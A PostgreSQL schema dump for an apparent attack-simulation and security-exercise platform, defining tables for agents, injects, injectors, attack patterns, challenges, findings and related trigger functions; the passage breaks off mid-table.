--
-- PostgreSQL database dump
--

\restrict axIpTVAWTDUH6WrfwdgfSYZrA2TmCJoBRbPHBlAMpCS5XLSnIqhpHY8y2la5kCu

-- Dumped from database version 17.7
-- Dumped by pg_dump version 17.7

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET transaction_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: hstore; Type: EXTENSION; Schema: -; Owner: -
--

CREATE EXTENSION IF NOT EXISTS hstore WITH SCHEMA public;


--
-- Name: EXTENSION hstore; Type: COMMENT; Schema: -; Owner: 
--

COMMENT ON EXTENSION hstore IS 'data type for storing sets of (key, value) pairs';


--
-- Name: pg_trgm; Type: EXTENSION; Schema: -; Owner: -
--

CREATE EXTENSION IF NOT EXISTS pg_trgm WITH SCHEMA public;


--
-- Name: EXTENSION pg_trgm; Type: COMMENT; Schema: -; Owner: 
--

COMMENT ON EXTENSION pg_trgm IS 'text similarity measurement and index searching based on trigrams';


--
-- Name: author_enum; Type: TYPE; Schema: public; Owner: user
--

CREATE TYPE public.author_enum AS ENUM (
    'HUMAN',
    'AI',
    'AI_OUTDATED'
);


ALTER TYPE public.author_enum OWNER TO "user";

--
-- Name: array_position_wrapper(anyelement, text); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.array_position_wrapper(a anyelement, b text) RETURNS integer
    LANGUAGE sql
    AS $$
  SELECT array_position(a, b)
      $$;


ALTER FUNCTION public.array_position_wrapper(a anyelement, b text) OWNER TO "user";

--
-- Name: array_to_string_wrapper(anyelement, text); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.array_to_string_wrapper(a anyelement, b text) RETURNS text
    LANGUAGE sql
    AS $$
  SELECT array_to_string(a, b)
      $$;


ALTER FUNCTION public.array_to_string_wrapper(a anyelement, b text) OWNER TO "user";

--
-- Name: array_union(anyarray, anyarray); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.array_union(a anyarray, b anyarray) RETURNS anyarray
    LANGUAGE sql
    AS $$SELECT array_agg(DISTINCT x)FROM (         SELECT unnest(a) x         UNION ALL SELECT unnest(b)     ) AS u    $$;


ALTER FUNCTION public.array_union(a anyarray, b anyarray) OWNER TO "user";

--
-- Name: delete_notification_rules_for_scenario(); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.delete_notification_rules_for_scenario() RETURNS trigger
    LANGUAGE plpgsql
    AS $$
      BEGIN
          DELETE FROM notification_rules
          WHERE notification_resource_type = 'SCENARIO'
              AND notification_resource_id = OLD.scenario_id;
          RETURN OLD;
      END;
      $$;


ALTER FUNCTION public.delete_notification_rules_for_scenario() OWNER TO "user";

--
-- Name: update_asset_updated_at_after_delete_finding(); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.update_asset_updated_at_after_delete_finding() RETURNS trigger
    LANGUAGE plpgsql
    AS $$
    BEGIN
        UPDATE public.assets
        SET asset_updated_at = now()
        WHERE asset_id = OLD.asset_id;
        RETURN OLD;
    END;
    $$;


ALTER FUNCTION public.update_asset_updated_at_after_delete_finding() OWNER TO "user";

--
-- Name: update_asset_updated_at_after_delete_inject(); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.update_asset_updated_at_after_delete_inject() RETURNS trigger
    LANGUAGE plpgsql
    AS $$
    BEGIN
        UPDATE public.assets
        SET asset_updated_at = now()
        WHERE asset_id = OLD.asset_id;
        RETURN OLD;
    END;
    $$;


ALTER FUNCTION public.update_asset_updated_at_after_delete_inject() OWNER TO "user";

--
-- Name: update_exercise_updated_at_after_delete_team(); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.update_exercise_updated_at_after_delete_team() RETURNS trigger
    LANGUAGE plpgsql
    AS $$
    BEGIN
        UPDATE public.exercises
        SET exercise_updated_at = now()
        WHERE exercise_id = OLD.exercise_id;
        RETURN OLD;
    END;
    $$;


ALTER FUNCTION public.update_exercise_updated_at_after_delete_team() OWNER TO "user";

--
-- Name: update_inject_updated_at_after_delete_inject_child(); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.update_inject_updated_at_after_delete_inject_child() RETURNS trigger
    LANGUAGE plpgsql
    AS $$
BEGIN
    UPDATE public.injects
    SET inject_updated_at = now()
    WHERE inject_id = OLD.inject_parent_id;
    RETURN OLD;
END;
$$;


ALTER FUNCTION public.update_inject_updated_at_after_delete_inject_child() OWNER TO "user";

--
-- Name: update_inject_updated_at_after_delete_team(); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.update_inject_updated_at_after_delete_team() RETURNS trigger
    LANGUAGE plpgsql
    AS $$
    BEGIN
        UPDATE public.injects
        SET inject_updated_at = now()
        WHERE inject_id = OLD.inject_id;
        RETURN OLD;
    END;
    $$;


ALTER FUNCTION public.update_inject_updated_at_after_delete_team() OWNER TO "user";

--
-- Name: update_injector_contract_updated_at(); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.update_injector_contract_updated_at() RETURNS trigger
    LANGUAGE plpgsql
    AS $$
BEGIN
    UPDATE public.injectors_contracts
    SET injector_contract_updated_at = now()
    WHERE injector_contract_id = OLD.injector_contract_id;  -- Use NEW. if it is AFTER INSERT

    RETURN OLD;
END;
$$;


ALTER FUNCTION public.update_injector_contract_updated_at() OWNER TO "user";

--
-- Name: update_launch_order_trigger(); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.update_launch_order_trigger() RETURNS trigger
    LANGUAGE plpgsql
    AS $$
BEGIN
    UPDATE exercises
    SET exercise_launch_order = CASE
        WHEN NEW.exercise_start_date IS NULL
            THEN NULL
        ELSE nextval('exercise_launch_order_seq')
        END
    WHERE exercise_id = NEW.exercise_id;
    RETURN NEW;
END;
$$;


ALTER FUNCTION public.update_launch_order_trigger() OWNER TO "user";

--
-- Name: update_scenario_updated_at_after_delete_team(); Type: FUNCTION; Schema: public; Owner: user
--

CREATE FUNCTION public.update_scenario_updated_at_after_delete_team() RETURNS trigger
    LANGUAGE plpgsql
    AS $$
    BEGIN
        UPDATE public.scenarios
        SET scenario_updated_at = now()
        WHERE scenario_id = OLD.scenario_id;
        RETURN OLD;
    END;
    $$;


ALTER FUNCTION public.update_scenario_updated_at_after_delete_team() OWNER TO "user";

--
-- Name: array_union_agg(anyarray); Type: AGGREGATE; Schema: public; Owner: user
--

CREATE AGGREGATE public.array_union_agg(anyarray) (
    SFUNC = public.array_union,
    STYPE = anyarray,
    INITCOND = '{}'
);


ALTER AGGREGATE public.array_union_agg(anyarray) OWNER TO "user";

SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: agents; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.agents (
    agent_id character varying(255) NOT NULL,
    agent_asset character varying(255) NOT NULL,
    agent_privilege character varying(255) NOT NULL,
    agent_deployment_mode character varying(255) NOT NULL,
    agent_executed_by_user character varying(255) NOT NULL,
    agent_executor character varying(255),
    agent_version character varying(255),
    agent_parent character varying(255),
    agent_inject character varying(255),
    agent_process_name character varying(255),
    agent_external_reference character varying(255),
    agent_last_seen timestamp without time zone,
    agent_created_at timestamp with time zone DEFAULT now(),
    agent_updated_at timestamp with time zone DEFAULT now(),
    agent_cleared_at timestamp without time zone DEFAULT now()
);


ALTER TABLE public.agents OWNER TO "user";

--
-- Name: articles; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.articles (
    article_id character varying(255) NOT NULL,
    article_created_at timestamp with time zone DEFAULT now() NOT NULL,
    article_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    article_name text,
    article_content text,
    article_channel character varying(255) NOT NULL,
    article_exercise character varying(255),
    article_author text,
    article_shares integer,
    article_likes integer,
    article_comments integer,
    article_scenario character varying(255)
);


ALTER TABLE public.articles OWNER TO "user";

--
-- Name: articles_documents; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.articles_documents (
    article_id character varying(255) NOT NULL,
    document_id character varying(255) NOT NULL
);


ALTER TABLE public.articles_documents OWNER TO "user";

--
-- Name: asset_agent_jobs; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.asset_agent_jobs (
    asset_agent_id character varying(255) NOT NULL,
    asset_agent_created_at timestamp with time zone DEFAULT now() NOT NULL,
    asset_agent_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    asset_agent_inject character varying(255),
    asset_agent_command text,
    asset_agent_agent character varying(255)
);


ALTER TABLE public.asset_agent_jobs OWNER TO "user";

--
-- Name: asset_groups; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.asset_groups (
    asset_group_id character varying(255) NOT NULL,
    asset_group_name character varying(255) NOT NULL,
    asset_group_description text,
    asset_group_created_at timestamp with time zone DEFAULT now() NOT NULL,
    asset_group_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    asset_group_dynamic_filter json DEFAULT '{"mode":"and","filters":[]}'::json NOT NULL,
    asset_group_external_reference character varying(255)
);


ALTER TABLE public.asset_groups OWNER TO "user";

--
-- Name: asset_groups_assets; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.asset_groups_assets (
    asset_group_id character varying(255) NOT NULL,
    asset_id character varying(255) NOT NULL
);


ALTER TABLE public.asset_groups_assets OWNER TO "user";

--
-- Name: asset_groups_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.asset_groups_tags (
    asset_group_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.asset_groups_tags OWNER TO "user";

--
-- Name: assets; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.assets (
    asset_id character varying(255) NOT NULL,
    asset_type character varying(255) NOT NULL,
    asset_name character varying(255) NOT NULL,
    asset_description text,
    asset_created_at timestamp with time zone DEFAULT now() NOT NULL,
    asset_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    endpoint_ips text[],
    endpoint_hostname character varying(255),
    endpoint_platform character varying(255),
    endpoint_mac_addresses text[],
    asset_external_reference character varying(255),
    endpoint_arch character varying(255) DEFAULT 'x86_64'::character varying NOT NULL,
    security_platform_type character varying(255),
    security_platform_logo_light character varying(255),
    security_platform_logo_dark character varying(255),
    endpoint_seen_ip character varying(255),
    endpoint_is_eol boolean DEFAULT false
);


ALTER TABLE public.assets OWNER TO "user";

--
-- Name: assets_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.assets_tags (
    asset_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.assets_tags OWNER TO "user";

--
-- Name: attack_patterns; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.attack_patterns (
    attack_pattern_id character varying(255) NOT NULL,
    attack_pattern_created_at timestamp with time zone DEFAULT now() NOT NULL,
    attack_pattern_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    attack_pattern_name character varying(255) NOT NULL,
    attack_pattern_description text,
    attack_pattern_external_id character varying(255) NOT NULL,
    attack_pattern_platforms text[],
    attack_pattern_permissions_required text[],
    attack_pattern_parent character varying(255),
    attack_pattern_stix_id character varying(255)
);


ALTER TABLE public.attack_patterns OWNER TO "user";

--
-- Name: attack_patterns_kill_chain_phases; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.attack_patterns_kill_chain_phases (
    attack_pattern_id character varying(255) NOT NULL,
    phase_id character varying(255) NOT NULL
);


ALTER TABLE public.attack_patterns_kill_chain_phases OWNER TO "user";

--
-- Name: challenge_attempts; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.challenge_attempts (
    challenge_id character varying(255) NOT NULL,
    inject_status_id character varying(255) NOT NULL,
    user_id character varying(255) NOT NULL,
    challenge_attempt integer DEFAULT 0 NOT NULL,
    attempt_created_at timestamp with time zone DEFAULT now() NOT NULL,
    attempt_updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.challenge_attempts OWNER TO "user";

--
-- Name: challenges; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.challenges (
    challenge_id character varying(255) NOT NULL,
    challenge_created_at timestamp with time zone DEFAULT now() NOT NULL,
    challenge_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    challenge_name text,
    challenge_flag text,
    challenge_category character varying(255),
    challenge_content text,
    challenge_score double precision,
    challenge_max_attempts integer
);


ALTER TABLE public.challenges OWNER TO "user";

--
-- Name: challenges_documents; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.challenges_documents (
    challenge_id character varying(255) NOT NULL,
    document_id character varying(255) NOT NULL
);


ALTER TABLE public.challenges_documents OWNER TO "user";

--
-- Name: challenges_flags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.challenges_flags (
    flag_id character varying(255) NOT NULL,
    flag_created_at timestamp with time zone DEFAULT now() NOT NULL,
    flag_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    flag_type character varying(255) NOT NULL,
    flag_value text NOT NULL,
    flag_challenge character varying(255) NOT NULL
);


ALTER TABLE public.challenges_flags OWNER TO "user";

--
-- Name: challenges_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.challenges_tags (
    challenge_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.challenges_tags OWNER TO "user";

--
-- Name: channels; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.channels (
    channel_id character varying(255) NOT NULL,
    channel_created_at timestamp with time zone DEFAULT now() NOT NULL,
    channel_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    channel_name text,
    channel_type character varying(255),
    channel_description text,
    channel_logo_dark character varying(255),
    channel_logo_light character varying(255),
    channel_primary_color_dark character varying(255),
    channel_primary_color_light character varying(255),
    channel_secondary_color_dark character varying(255),
    channel_secondary_color_light character varying(255),
    channel_mode character varying(255)
);


ALTER TABLE public.channels OWNER TO "user";

--
-- Name: collectors; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.collectors (
    collector_id character varying(255) NOT NULL,
    collector_created_at timestamp with time zone DEFAULT now() NOT NULL,
    collector_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    collector_name character varying(255) NOT NULL,
    collector_type character varying(255) NOT NULL,
    collector_period integer NOT NULL,
    collector_last_execution timestamp without time zone,
    collector_external boolean DEFAULT false NOT NULL,
    collector_security_platform character varying(255),
    collector_state jsonb DEFAULT '{}'::jsonb
);


ALTER TABLE public.collectors OWNER TO "user";

--
-- Name: comchecks; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.comchecks (
    comcheck_id character varying(255) NOT NULL,
    comcheck_exercise character varying(255) DEFAULT NULL::character varying,
    comcheck_start_date timestamp(0) with time zone NOT NULL,
    comcheck_end_date timestamp(0) with time zone NOT NULL,
    comcheck_state character varying(256),
    comcheck_subject character varying(256),
    comcheck_message text,
    comcheck_name character varying(256)
);


ALTER TABLE public.comchecks OWNER TO "user";

--
-- Name: comchecks_statuses; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.comchecks_statuses (
    status_id character varying(255) NOT NULL,
    status_user character varying(255) DEFAULT NULL::character varying,
    status_comcheck character varying(255) DEFAULT NULL::character varying,
    status_sent_date timestamp without time zone,
    status_receive_date timestamp without time zone,
    status_sent_retry integer
);


ALTER TABLE public.comchecks_statuses OWNER TO "user";

--
-- Name: communications; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.communications (
    communication_id character varying(255) NOT NULL,
    communication_received_at timestamp without time zone NOT NULL,
    communication_sent_at timestamp without time zone NOT NULL,
    communication_subject text,
    communication_content text,
    communication_message_id text NOT NULL,
    communication_inject character varying(255),
    communication_ack boolean DEFAULT false,
    communication_animation boolean DEFAULT false,
    communication_content_html text,
    communication_from text NOT NULL,
    communication_to text NOT NULL,
    communication_attachments text[]
);


ALTER TABLE public.communications OWNER TO "user";

--
-- Name: communications_users; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.communications_users (
    communication_id character varying(255) NOT NULL,
    user_id character varying(255) NOT NULL
);


ALTER TABLE public.communications_users OWNER TO "user";

--
-- Name: contract_output_elements; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.contract_output_elements (
    contract_output_element_id character varying(255) NOT NULL,
    contract_output_element_is_finding boolean DEFAULT true,
    contract_output_element_rule text NOT NULL,
    contract_output_element_name character varying(50) NOT NULL,
    contract_output_element_key character varying(255) NOT NULL,
    contract_output_element_type character varying(50) NOT NULL,
    contract_output_element_output_parser_id character varying(255) NOT NULL,
    contract_output_element_created_at timestamp(0) with time zone DEFAULT now(),
    contract_output_element_updated_at timestamp(0) with time zone DEFAULT now()
);


ALTER TABLE public.contract_output_elements OWNER TO "user";

--
-- Name: contract_output_elements_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.contract_output_elements_tags (
    contract_output_element_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.contract_output_elements_tags OWNER TO "user";

--
-- Name: custom_dashboards; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.custom_dashboards (
    custom_dashboard_id character varying(255) NOT NULL,
    custom_dashboard_name character varying(255) NOT NULL,
    custom_dashboard_description character varying(255),
    custom_dashboard_created_at timestamp with time zone DEFAULT now(),
    custom_dashboard_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.custom_dashboards OWNER TO "user";

--
-- Name: custom_dashboards_parameters; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.custom_dashboards_parameters (
    custom_dashboards_parameter_id character varying(255) NOT NULL,
    custom_dashboard_id character varying(255) NOT NULL,
    custom_dashboards_parameter_name text NOT NULL,
    custom_dashboards_parameter_type text NOT NULL
);


ALTER TABLE public.custom_dashboards_parameters OWNER TO "user";

--
-- Name: cwes; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.cwes (
    cwe_id character varying(255) NOT NULL,
    cwe_external_id character varying(255) NOT NULL,
    cwe_source character varying(255),
    cwe_created_at timestamp with time zone DEFAULT now(),
    cwe_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.cwes OWNER TO "user";

--
-- Name: detection_remediations; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.detection_remediations (
    detection_remediation_id character varying(255) NOT NULL,
    detection_remediation_payload_id character varying(255) NOT NULL,
    detection_remediation_values text,
    detection_remediation_created_at timestamp with time zone DEFAULT now(),
    detection_remediation_updated_at timestamp with time zone DEFAULT now(),
    detection_remediation_collector_type character varying(255),
    author_rule public.author_enum DEFAULT 'HUMAN'::public.author_enum NOT NULL
);


ALTER TABLE public.detection_remediations OWNER TO "user";

--
-- Name: documents; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.documents (
    document_id character varying(255) NOT NULL,
    document_name character varying(255) NOT NULL,
    document_description character varying(255) DEFAULT NULL::character varying,
    document_type character varying(255) NOT NULL,
    document_target text
);


ALTER TABLE public.documents OWNER TO "user";

--
-- Name: documents_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.documents_tags (
    document_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.documents_tags OWNER TO "user";

--
-- Name: evaluations; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.evaluations (
    evaluation_id character varying(255) NOT NULL,
    evaluation_score bigint,
    evaluation_objective character varying(255) NOT NULL,
    evaluation_user character varying(255) NOT NULL,
    evaluation_created_at timestamp with time zone DEFAULT now() NOT NULL,
    evaluation_updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.evaluations OWNER TO "user";

--
-- Name: execution_traces; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.execution_traces (
    execution_trace_id character varying(255) NOT NULL,
    execution_inject_status_id character varying(255),
    execution_inject_test_status_id character varying(255),
    execution_agent_id character varying(255),
    execution_message text NOT NULL,
    execution_action character varying(255),
    execution_status character varying(255) NOT NULL,
    execution_time timestamp without time zone,
    execution_created_at timestamp with time zone DEFAULT now(),
    execution_updated_at timestamp with time zone DEFAULT now(),
    execution_context_identifiers text[],
    execution_structured_output text,
    CONSTRAINT check_inject_status_or_test_status CHECK (((execution_inject_status_id IS NOT NULL) OR (execution_inject_test_status_id IS NOT NULL)))
);


ALTER TABLE public.execution_traces OWNER TO "user";

--
-- Name: executors; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.executors (
    executor_id character varying(255) NOT NULL,
    executor_created_at timestamp with time zone DEFAULT now() NOT NULL,
    executor_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    executor_name character varying(255) NOT NULL,
    executor_type character varying(255) NOT NULL,
    executor_platforms text[],
    executor_doc text,
    executor_background_color character varying(100)
);


ALTER TABLE public.executors OWNER TO "user";

--
-- Name: exercise_launch_order_seq; Type: SEQUENCE; Schema: public; Owner: user
--

CREATE SEQUENCE public.exercise_launch_order_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public.exercise_launch_order_seq OWNER TO "user";

--
-- Name: exercise_mails_reply_to; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.exercise_mails_reply_to (
    exercise_id character varying(255) NOT NULL,
    exercise_reply_to character varying(255)
);


ALTER TABLE public.exercise_mails_reply_to OWNER TO "user";

--
-- Name: exercises; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.exercises (
    exercise_id character varying(255) NOT NULL,
    exercise_name character varying(255) NOT NULL,
    exercise_subtitle text,
    exercise_description text,
    exercise_start_date timestamp(0) with time zone,
    exercise_end_date timestamp(0) with time zone,
    exercise_mail_from text NOT NULL,
    exercise_message_header character varying(255) DEFAULT NULL::character varying,
    exercise_message_footer character varying(255) DEFAULT NULL::character varying,
    exercise_created_at timestamp with time zone DEFAULT now() NOT NULL,
    exercise_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    exercise_status character varying(255) DEFAULT 'SCHEDULED'::character varying NOT NULL,
    exercise_logo_dark character varying(255),
    exercise_logo_light character varying(255),
    exercise_lessons_anonymized boolean DEFAULT false,
    exercise_category character varying(255),
    exercise_severity character varying(255),
    exercise_main_focus character varying(255),
    exercise_pause_date timestamp with time zone,
    exercise_launch_order bigint,
    exercise_custom_dashboard character varying(255),
    exercise_security_coverage character varying(255)
);


ALTER TABLE public.exercises OWNER TO "user";

--
-- Name: exercises_documents; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.exercises_documents (
    exercise_id character varying(255) NOT NULL,
    document_id character varying(255) NOT NULL
);


ALTER TABLE public.exercises_documents OWNER TO "user";

--
-- Name: exercises_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.exercises_tags (
    exercise_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.exercises_tags OWNER TO "user";

--
-- Name: exercises_teams; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.exercises_teams (
    exercise_id character varying(255) NOT NULL,
    team_id character varying(255) NOT NULL
);


ALTER TABLE public.exercises_teams OWNER TO "user";

--
-- Name: exercises_teams_users; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.exercises_teams_users (
    exercise_id character varying(255) NOT NULL,
    team_id character varying(255) NOT NULL,
    user_id character varying(255) NOT NULL
);


ALTER TABLE public.exercises_teams_users OWNER TO "user";

--
-- Name: findings; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.findings (
    finding_id character varying(255) NOT NULL,
    finding_field character varying(255) NOT NULL,
    finding_type character varying(255) NOT NULL,
    finding_value text NOT NULL,
    finding_labels text[],
    finding_inject_id character varying(255) NOT NULL,
    finding_created_at timestamp with time zone DEFAULT now(),
    finding_updated_at timestamp with time zone DEFAULT now(),
    finding_name character varying(255)
);


ALTER TABLE public.findings OWNER TO "user";

--
-- Name: findings_assets; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.findings_assets (
    finding_id character varying(255) NOT NULL,
    asset_id character varying(255) NOT NULL
);


ALTER TABLE public.findings_assets OWNER TO "user";

--
-- Name: findings_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.findings_tags (
    finding_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.findings_tags OWNER TO "user";

--
-- Name: findings_teams; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.findings_teams (
    finding_id character varying(255) NOT NULL,
    team_id character varying(255) NOT NULL
);


ALTER TABLE public.findings_teams OWNER TO "user";

--
-- Name: findings_users; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.findings_users (
    finding_id character varying(255) NOT NULL,
    user_id character varying(255) NOT NULL
);


ALTER TABLE public.findings_users OWNER TO "user";

--
-- Name: grants; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.grants (
    grant_id character varying(255) NOT NULL,
    grant_group character varying(255) DEFAULT NULL::character varying,
    grant_name character varying(255) NOT NULL,
    grant_resource character varying(255) DEFAULT NULL::character varying,
    grant_resource_type character varying(50) NOT NULL
);


ALTER TABLE public.grants OWNER TO "user";

--
-- Name: groups; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.groups (
    group_id character varying(255) NOT NULL,
    group_name character varying(255) NOT NULL,
    group_description text,
    group_default_user_assign boolean DEFAULT false
);


ALTER TABLE public.groups OWNER TO "user";

--
-- Name: groups_roles; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.groups_roles (
    role_id character varying(255) NOT NULL,
    group_id character varying(255) NOT NULL
);


ALTER TABLE public.groups_roles OWNER TO "user";

--
-- Name: import_mappers; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.import_mappers (
    mapper_id uuid NOT NULL,
    mapper_name character varying(255) NOT NULL,
    mapper_inject_type_column character varying(255) NOT NULL,
    mapper_created_at timestamp with time zone DEFAULT now(),
    mapper_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.import_mappers OWNER TO "user";

--
-- Name: indexing_status; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.indexing_status (
    indexing_status_type text NOT NULL,
    indexing_status_indexing_date timestamp with time zone NOT NULL
);


ALTER TABLE public.indexing_status OWNER TO "user";

--
-- Name: inject_importers; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.inject_importers (
    importer_id uuid NOT NULL,
    importer_mapper_id uuid,
    importer_import_type_value character varying(255) NOT NULL,
    importer_injector_contract_id character varying(255),
    importer_created_at timestamp with time zone DEFAULT now(),
    importer_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.inject_importers OWNER TO "user";

--
-- Name: injectors; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injectors (
    injector_id character varying(255) NOT NULL,
    injector_created_at timestamp with time zone DEFAULT now() NOT NULL,
    injector_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    injector_name character varying(255) NOT NULL,
    injector_type character varying(255) NOT NULL,
    injector_external boolean DEFAULT false NOT NULL,
    injector_custom_contracts boolean DEFAULT false,
    injector_category character varying(255),
    injector_executor_commands public.hstore,
    injector_executor_clear_commands public.hstore,
    injector_payloads boolean DEFAULT false,
    injector_dependencies text[] DEFAULT '{}'::text[]
);


ALTER TABLE public.injectors OWNER TO "user";

--
-- Name: injectors_contracts; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injectors_contracts (
    injector_contract_id character varying(255) NOT NULL,
    injector_contract_created_at timestamp with time zone DEFAULT now() NOT NULL,
    injector_contract_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    injector_contract_labels public.hstore,
    injector_contract_manual boolean,
    injector_contract_content text NOT NULL,
    injector_id character varying(255) NOT NULL,
    injector_contract_atomic_testing boolean DEFAULT true NOT NULL,
    injector_contract_custom boolean DEFAULT false,
    injector_contract_platforms text[],
    injector_contract_needs_executor boolean DEFAULT false,
    injector_contract_payload character varying(255),
    injector_contract_import_available boolean DEFAULT false NOT NULL,
    injector_contract_external_id character varying
);


ALTER TABLE public.injectors_contracts OWNER TO "user";

--
-- Name: injectors_contracts_attack_patterns; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injectors_contracts_attack_patterns (
    attack_pattern_id character varying(255) NOT NULL,
    injector_contract_id character varying(255) NOT NULL
);


ALTER TABLE public.injectors_contracts_attack_patterns OWNER TO "user";

--
-- Name: injectors_contracts_vulnerabilities; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injectors_contracts_vulnerabilities (
    injector_contract_id character varying(255) NOT NULL,
    vulnerability_id character varying(255) NOT NULL
);


ALTER TABLE public.injectors_contracts_vulnerabilities OWNER TO "user";

--
-- Name: injects; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects (
    inject_id character varying(255) NOT NULL,
    inject_user character varying(255) DEFAULT NULL::character varying,
    inject_title character varying(255) NOT NULL,
    inject_description text,
    inject_content text,
    inject_all_teams boolean NOT NULL,
    inject_enabled boolean NOT NULL,
    inject_depends_duration bigint NOT NULL,
    inject_depends_from_another character varying(255),
    inject_exercise character varying(255),
    inject_created_at timestamp with time zone DEFAULT now() NOT NULL,
    inject_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    inject_country character varying(255),
    inject_city character varying(255),
    inject_injector_contract character varying(256),
    inject_assets character varying(256),
    injects_asset_groups character varying(256),
    inject_scenario character varying(255),
    inject_trigger_now_date timestamp without time zone,
    inject_collect_status character varying(255)
);


ALTER TABLE public.injects OWNER TO "user";

--
-- Name: injects_asset_groups; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects_asset_groups (
